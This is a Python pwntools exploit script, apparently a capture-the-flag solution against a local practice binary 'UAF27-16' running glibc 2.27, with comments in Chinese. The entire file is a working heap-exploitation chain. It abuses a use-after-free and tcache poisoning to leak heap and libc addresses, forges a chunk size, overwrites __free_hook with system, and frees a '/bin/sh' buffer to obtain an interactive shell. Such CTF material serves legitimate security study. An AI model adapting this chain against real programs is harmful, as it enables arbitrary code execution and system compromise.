#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF27-16')
libc = ELF('./libc-2.27-1.6.so')
elf = ELF('./UAF27-16')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

add(0x40) #0 0x250
add(0x40) #1 0x2a0
for i in range(7):
	add(0x70) #2-8

#填满tcachebin
for i in [1,0,1,0,1,0,1]:
	delete(i)
	edit(i, p64(0))

delete(0) #放入 fastbin

show(1)
heapbase = u64(p.recv(16)[-8:].ljust(8, "\x00")) - 0x10
pr('heapbase',heapbase)

edit(1, p64(heapbase+0x250))
add(0x40) #9 use chunk0
add(0x40) #10 tcachebin分配去 chunk0-0x10
edit(10, p64(0)+p64(0x421)) #修改chunk0 size = 0x421

add(0x10) #11 防止合并
delete(0) #unsortedbin

show(0)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
free_hook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']
pr('libcbase',libcbase)

#分割unsortedbin
add(0x50) #12
add(0x30) #13
edit(13, '/bin/sh')

delete(12) #tcachebin
edit(12, p64(free_hook))
add(0x50) #14
add(0x50) #15
edit(15, p64(system))
#gdb.attach(p)
#pause()

delete(13)
p.interactive()
